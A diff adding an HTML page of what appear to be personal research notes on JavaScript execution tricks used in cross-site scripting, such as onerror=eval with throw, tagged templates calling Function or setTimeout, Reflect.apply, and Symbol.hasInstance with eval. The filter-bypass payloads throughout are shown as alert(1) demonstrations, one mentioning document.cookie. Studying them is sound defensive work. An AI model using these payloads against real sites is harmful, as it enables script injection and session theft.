@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>alert(1) — DOM Security Research</title>
+  <meta name="description" content="Research on JavaScript execution vectors and techniques.">
+  <link rel="stylesheet" href="../../style.css">
+  <link rel="stylesheet" href="../dom-styles.css">
+</head>
+<body>
+  <header>
+    <div class="header-inner">
+      <a class="logo" href="../">
+        <div>
+          <div class="logo-text">ALERT</div>
+          <div class="logo-sub">Execution</div>
+        </div>
+      </a>
+      <div class="header-stats">
+        <div class="stat-pill">TOPIC <span>ALERT(1)</span></div>
+      </div>
+    </div>
+  </header>
+
+  <main class="topic-wrap">
+      <h1 class="topic-title">alert(1)</h1>
+      <p class="topic-desc">Research notes on JavaScript execution primitives, template literals, error handling, tagged templates, and Symbol.hasInstance abuse.</p>
+
+      <article class="vuln-card found">
+        <div class="obsidian-note">
+    <h2>ValueOf and toString</h2>
+
+    <p>If you add <code>1</code> to the <code>window</code> object, JavaScript will try to convert <code>window</code> to a primitive value. To do that, it looks for methods like <code>valueOf</code>. If we override <code>window.valueOf</code> and assign it to <code>alert</code>, then when the conversion happens, <code>alert</code> will be called.</p>
+    <pre><code class="language-js">window.valueOf=alert;window+1//calls alert()</code></pre>
+
+    <p>The same shit will happend if we add an empty char (' ') .In that case, JavaScript tries to convert <code>window</code> to a string, so it calls the <code>toString</code> method. If we override <code>window.toString</code>, we can control what gets executed during that conversion.</p>
+    <pre><code class="language-js">toString=alert;window+''</code></pre>
+
+    <h2>Throw</h2>
+    <p>(esto no funciona en navegadores actuales, investigare mas adelante) (creo que solo funciona en html y no en consola)</p>
+
+    <p>When a <code>throw</code> statement is executed and the exception is not caught, JavaScript treats it as an uncaught error. In that case, it calls the global error handler <code>window.onerror</code>. If we override <code>window.onerror</code> and assign it to <code>alert</code>, then triggering an uncaught exception will cause <code>alert</code> to run.</p>
+    <pre><code class="language-js">onerror=alert;throw 'foo'</code></pre>
+
+    <p>If we want to execute arbitrary ajvascript such as alert(document.cookie), one approach is to use the <code>eval</code> function together with the global error handler:</p>
+    <pre><code class="language-js">onerror=eval;throw 'alert(1)'</code></pre>
+
+    <p>However, the payload above won't be executed because the throw will return <code>eval("Uncaught alert(1)")</code>, to bypass this we can add a <code>=</code> to the alert so when the eval function executes, the output will be <code>eval(Uncaught=alert(1))</code> which is valid JavaScript because Uncaught it's treated as a variable .</p>
+    <pre><code class="language-js">onerror=eval;throw '=alert(1)'</code></pre>
+
+    <p>The comma operand could be us as the output of a throw exception:</p>
+    <pre><code class="language-js">throw onerror=alert,1 //alert("Uncaught 1")</code></pre>
+
+    <p>The comma will allways pass the LAST operand to the error handler :</p>
+    <pre><code class="language-js">throw onerror=alert,1,2,3,4,5,6,7,8,9,10//Uncaught 10</code></pre>
+
+    <p>Another feature in js is optional exception variables inside a cathc clause</p>
+    <pre><code class="language-js">try{throw onerror=alert}catch{throw 1}</code></pre>
+
+    <h2>Tagged templates</h2>
+
+    <p>Instead of using parentheses we could use the templated strings :</p>
+    <pre><code class="language-js">alert`1`</code></pre>
+
+    <p>Templated strings also support placeholders (<code>${}</code>)  and nested template strings</p>
+    <pre><code class="language-js">`${alert\x281\x29}`
+  `${`${alert\x281\x29}`}`</code></pre>
+
+    <p>Inside template strings we could separate strings with a placeholder</p>
+    <pre><code class="language-js">alert`foobar`//foobar 
+  alert`foo${1}bar`//foo,bar</code></pre>
+
+    <p>If instead of using alert we use eval with an alert inside template strings the eval won't execute the alert, this is because the eval will return an array of chars inted of converting the arguments into strings , if you use setTimeout() instead then the alert will be called :</p>
+    <pre><code class="language-js">setTimeout`alert\x281\x29`//alert(1) called</code></pre>
+
+    <p>A normal use of a tagged template might look like this :</p>
+    <pre><code class="language-js">`Hello ${name}`</code></pre>
+
+    <p>But if we add a function before it:</p>
+    <pre><code class="language-js">myFunction`Hello ${name}`</code></pre>
+
+    <p>This won’t evaluate the string directly. Instead, JavaScript transforms it into something like:</p>
+    <pre><code class="language-js">myFunction(["Hello ", ""], name)</code></pre>
+
+    <p>The first argument is an array containing the literal parts of the template. In this case:
+  `"Hello "` is the text before the placeholder, `""` is the empty string after ${name}</p>
+
+    <p>The <code>${name}</code> expression is not included in the array; instead, its evaluated value is passed as a separate argument.</p>
+
+    <p>The <code>Function</code> constructor works like this:</p>
+    <pre><code class="language-js">new Function("a", "b", "return a + b")</code></pre>
+
+    <p>The last argument becomes the function body, while the previous arguments define the parameters.</p>
+
+    <p>Here’s where the trick comes in. If we call <code>Function</code> using a tagged template to pop-up alert:</p>
+    <pre><code class="language-js">Function`x${'alert\x281\x29'}`</code></pre>
+
+    <p>JavaScript will interpret it roughly as:</p>
+    <pre><code class="language-js">Function(["x", ""], "alert(1)")</code></pre>
+
+    <p>The array <code>["x", ""]</code> is coerced into a string (<code>"x,"</code>), which becomes the function’s parameter list, and <code>"alert(1)"</code> becomes the function body.</p>
+
+    <p>This results in a function similar to:</p>
+    <pre><code class="language-js">function anonymous(x,) {  
+  alert(1)  
+  }</code></pre>
+
+    <p>Now let's play with the <code>replace</code></p>
+    <pre><code class="language-js">'a'.replace(/./, alert)</code></pre>
+
+    <p>Why does this work?. <code>.replace</code> will look for a match using the regex <code>/./</code> (any single char), it will find the <code>'a'</code> and call alert with the match, So internally, it behaves like: <code>alert("a")</code></p>
+
+    <p>With this idea in mind we will apply it to tagged templates:</p>
+    <pre><code class="language-js">'a,'.replace`a${alert}`</code></pre>
+
+    <p>JavaScript transforms this into something like:</p>
+    <pre><code class="language-js">'a,'.replace(["a", ""], alert)</code></pre>
+
+    <p>The array on the first argument will be coerced into <code>a,</code> string (with toString), so the payload will do the same thing as this other payload:</p>
+    <pre><code class="language-js">'a,'.replace("a,", alert)</code></pre>
+
+    <p>Finnaly calling :</p>
+    <pre><code class="language-js">alert("a,")</code></pre>
+
+    <p>We need to write the comma because of the array passed by the tagged template.</p>
+
+    <p>We can apply this with <code>.call</code> in a better way</p>
+    <pre><code class="language-js">'a'.replace.call`1${/./}${alert}`</code></pre>
+
+    <p><code>this -&gt; "1,"</code>
+  <code>/./</code> -&gt; will match all chars
+  <code>alert</code> -&gt; callback</p>
+
+    <p>We can also use <code>Reflect.apply</code> with this syntaxis:</p>
+    <pre><code class="language-js">Reflect.apply(func, thisArg, argsArray)</code></pre>
+    <pre><code class="language-js">Reflect.apply.call`${alert}${window}${[1]}`</code></pre>
+
+    <p>The translation might look like :</p>
+    <pre><code class="language-js">Reflect.apply(alert, window, [1])</code></pre>
+
+    <p>This will call alert(1). If you are asking why the tagged templates don't pass an empty array in first place, they do, but the first argument in a <code>.call</code> is the <code>this</code>, in this case it won't affect the functionallity at all.</p>
+
+    <p>We could also do it with href:</p>
+    <pre><code class="language-js">Reflect.set.call`${location}${'href'}${'javascript:alert(1)'}`</code></pre>
+
+    <h2>Has instance symbol</h2>
+
+    <p>What is instanceOf noramlly?, we usually use it like this:</p>
+    <pre><code class="language-js">[] instanceof Array // true because the left value is an instance of the right constructor</code></pre>
+
+    <p>JavaScript lets us customize how <code>instanceOf</code> behaves <code>Symbol.hasInstance</code>, for example we could define it as follow:</p>
+    <pre><code class="language-js">const obj = {  
+  [Symbol.hasInstance](value) {  
+  console.log(value);  
+  return true;  
+  }  
+  };  
+  
+  "hello" instanceof obj;</code></pre>
+
+    <p>The output will be <code>"hello"</code>.</p>
+
+    <p>Now we know that <code>instaceOf</code> can call a function, and it pass the left operand as an argument. A way to abuse this is:</p>
+    <pre><code class="language-js">'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}//calls
+  alert(1)</code></pre>
+
+    <p>or</p>
+    <pre><code class="language-js">'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}//calls alert(1)</code></pre>
+        </div>
+      </article>
+
+    <a class="back-btn" href="../">← Back to DOM Research</a>
+  </main>
+</body>
+</html>
